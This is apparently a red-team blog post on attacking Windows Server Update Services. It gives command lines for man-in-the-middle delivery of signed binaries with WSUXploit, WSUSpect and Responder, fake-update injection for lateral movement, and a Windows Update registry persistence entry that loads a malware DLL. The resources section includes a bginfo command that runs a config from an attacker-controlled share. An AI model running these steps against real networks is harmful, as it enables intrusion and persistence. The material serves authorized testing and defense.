---
layout: single
title: Red Teaming WSUS
date: 2020-06-15
classes: wide
tags:
  - Red Team
---

# Introduction

Windows updates are an important aspect of security in every organization. For a Windows Update to be delivered at an endpoint, the endpoint will first have to either check for any new updates online or check with a local WSUS server for the same matter.  

# Windows Update Fundamentals  

## Windows Update from a security perspective  

  - Privileged service. Updates can be downloaded and installed by non-privileged users. Potential privilege escalation.  
  - Windows Update downloads and executes code over the internet. This introduces a huge attack vector if not done properly.  
  - 3rd Party code is also distributed trough Windows Update, such as drivers.  
  - Any malicious code that manages to be delivered through Windows Update will look trustworthy.  

## Overview  

  - Windows service.  
  - wuauclt.exe runs periodically to check for updates.  
  - Reg Keys govern various details: 
    - Update Server's location.  
    - Update frequency.    
    - Privilege escalation of unprivileged users.  
  - Communication between client and server takes place over HTTPS / SOAP XML web service.  
  - Local database of updates saved into ```C:\Windows\SoftwareDistribution\DataStore\DataStore.edb```  
  - Updates end up in ```C:\Windows\SoftwareDistribution\Download```  
  - Logs are kept in ```C:\Windows\WindowsUpdate.log```  

## Update Types  

  - Critical Update  
  - Security Update  
  - Definition Update  
  - Update Rollup  
  - Service Pack  
  - Tool  
  - Feature Pack  
  - Update  
  - Drivers  

## Windows Software Update Services (WSUS)  

### Overview  

  - WSUS can be seen as the enterprise variant of Windows Update  
  - WSUS is actually the Windows Update software responsible for the fetching, downloading and installing of Windows updates but it is installed and run from an organization’s own local server.   
  - Same underlying communications Web Service / SOAP XML  
  - Updates fetched from WSUS within the organisation, not from a remote MS server.  
  - Administrators have full control over what will be installed.  

### WSUS Security  

  - SSL not enabled by default  
  - WSUS checks each update's digital signature and hash while downloading.  
  - All updates must be signed by Microsoft.  
  - Default Windows behaviour it to download and install drivers for new devices.  
  - Drivers must be signed, though not necessarily by Microsoft  


### Identify WSUS  

  - ```reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer``` --> 1==WSUS, 0!=WSUS.  
  - ```reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer``` --> Get WSUS URL  
  - ```reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"``` Check if proxy automatic detection is enabled. 5th byte of the result must be even!

# Attacking WSUS  

## Unencrypted communications  

### WSUXploit  

**Requirements**  

  - SSL Must be disabled (default)  
  - Only signed binaries by MS can be delivered (PsExec)  
  - ARP Spoofing or tampering system's proxy settings ability. 
  - Windows 10 Not Supported.  
  - ```pip2.7 install twisted``` 
  - OS Requirements: samba dsniff iptables  

```bash
# clone WSUXploit repository
git clone https://github.com/pimps/wsuxploit.git

# enter on wsuxploit directory
cd wsuxploit

# clone WSUSpect Proxy repository
git clone https://github.com/ctxis/wsuspect-proxy.git
```
**Attack**  

  - ```./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>```   
  - Bettercap can be used for ARP Spoofing.  


### WSUSpect

**Requirements**  

  - SSL Must be disabled (default)  
  - Only signed binaries by MS can be delivered (PsExec)  
  - ARP Spoofing or tampering system's proxy settings ability. 
  - Windows 10 Not Supported.  
  - ```pip2.7 install twisted```  

**Attack**

  - ```python Responder.py -I eth0 -wFb```
  - ```python2.7 wsuspect_proxy.py psexec``` --> Example
  - bginfo can be abused to load vbs scripts.  


## Leveraging WSUS Interconnectivity  

Sensitive information could be in a separate network which is difficult to reach. WSUS is usually within our reach and may communicate with another WSUS server if "Multiple Internally Synchronized WSUS Servers" Network architecture exists. Compromising a WSUS server could be used to reach segregated networks.  

Fake updates can be injected into the WSUS Database using [WSUSpendu](https://github.com/AlsidOfficial/WSUSpendu), the WSUS database will be eventually be synchronized between all the domain's WSUS servers.  

[Stealthily Spreading the Compromise Through Windows Server Update](./Stealthily Spreading the Compromise Through Windows Server Update.md)

# Leveraging Windows Update For Persistence  

Windows Update uses the following autostart key:  
  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Setup\ServiceStartup`  

Example Entry:
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Setup\ServiceStartup\malware.dll
"RegistrationFlags"=dword:00000001
"CacheFile"="C:\\test\\malware.dll"
"TargetFile"="C:\\WINDOWS\\system32\\malware.dll"
```  

This entry will copy malware.dll to c:\windows\system32\malware.dll and load it.  

> Not working on Windows 8 or 10 (Different triggering method required)  

# Resources  

  - [WSUSpect Proxy](https://github.com/ctxis/wsuspect-proxy)  
  - [WSUSPect Compromising the Windows Enterprise via Windows Update](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf)  **```bginfo \\attacker\share\config.bgi /nolicprompt /timer:0```**  
  - [wsuxploit](https://github.com/pimps/wsuxploit)  
  - [WSUSPendu](https://github.com/AlsidOfficial/WSUSpendu)  
  - [Create bginfo config to run vbs](https://www.howtogeek.com/school/sysinternals-pro/lesson7/)  
  - [Beyond good ol’ Run key, Part 60](http://www.hexacorn.com/blog/2017/03/18/beyond-good-ol-run-key-part-60/)  
